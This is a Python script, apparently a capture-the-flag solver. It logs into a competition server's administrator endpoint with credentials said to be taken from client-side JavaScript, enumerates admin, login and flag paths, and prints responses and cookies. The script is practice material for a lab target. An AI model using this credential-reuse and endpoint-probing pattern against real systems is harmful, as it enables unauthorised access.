#!/usr/bin/env python3
"""
Access the administrator endpoint with decoded credentials
"""

import requests
import base64
import json

def access_admin_panel():
    base_url = "http://chals.uscc-cyberbowl-2025.ctf.institute:3004"
    admin_endpoint = "/administrator"
    
    # Credentials extracted from JavaScript
    username = "admin1strat0r"
    password = "cIjCWTEY5!g7AY^LPy%r"
    
    # Create session
    session = requests.Session()
    
    # Create Basic Auth header
    auth_string = f"{username}:{password}"
    auth_encoded = base64.b64encode(auth_string.encode()).decode()
    
    print(f"[*] Attempting to access {base_url}{admin_endpoint}")
    print(f"[*] Username: {username}")
    print(f"[*] Password: {password}")
    print(f"[*] Authorization: Basic {auth_encoded}")
    
    # Try GET request first
    print("\n[*] Trying GET request...")
    headers = {
        'Authorization': f'Basic {auth_encoded}',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
    }
    
    try:
        response = session.get(base_url + admin_endpoint, headers=headers)
        print(f"[+] GET Status Code: {response.status_code}")
        print(f"[+] Response Headers: {dict(response.headers)}")
        print(f"[+] Response Content:\n{response.text}")
    except Exception as e:
        print(f"[-] GET Error: {e}")
    
    # Try POST request as the JavaScript suggests
    print("\n[*] Trying POST request...")
    headers['Content-Type'] = 'application/json'
    
    payload = {
        'username': username,
        'password': password,
        'endpoint': admin_endpoint
    }
    
    try:
        response = session.post(base_url + admin_endpoint, 
                              headers=headers, 
                              json=payload)
        print(f"[+] POST Status Code: {response.status_code}")
        print(f"[+] Response Headers: {dict(response.headers)}")
        print(f"[+] Response Content:\n{response.text}")
        
        # Check if response is JSON
        try:
            json_response = response.json()
            print(f"\n[+] JSON Response: {json.dumps(json_response, indent=2)}")
        except:
            pass
    except Exception as e:
        print(f"[-] POST Error: {e}")
    
    # Also try without the endpoint in the payload
    print("\n[*] Trying POST without endpoint in payload...")
    payload = {
        'username': username,
        'password': password
    }
    
    try:
        response = session.post(base_url + admin_endpoint, 
                              headers=headers, 
                              json=payload)
        print(f"[+] POST Status Code: {response.status_code}")
        print(f"[+] Response Content:\n{response.text}")
    except Exception as e:
        print(f"[-] POST Error: {e}")
    
    # Try alternative endpoints
    print("\n[*] Trying alternative endpoints...")
    alternative_endpoints = [
        "/admin",
        "/api/administrator",
        "/api/admin",
        "/login",
        "/api/login",
        "/api/flag"
    ]
    
    for endpoint in alternative_endpoints:
        try:
            response = session.get(base_url + endpoint, headers=headers)
            if response.status_code != 404:
                print(f"[+] Found {endpoint}: Status {response.status_code}")
                if response.status_code == 200 and len(response.text) < 1000:
                    print(f"    Content: {response.text}")
        except:
            pass
    
    # Check if there's a flag in cookies or headers
    print("\n[*] Checking response cookies...")
    for cookie in session.cookies:
        print(f"[+] Cookie: {cookie.name} = {cookie.value}")

if __name__ == "__main__":
    access_admin_panel()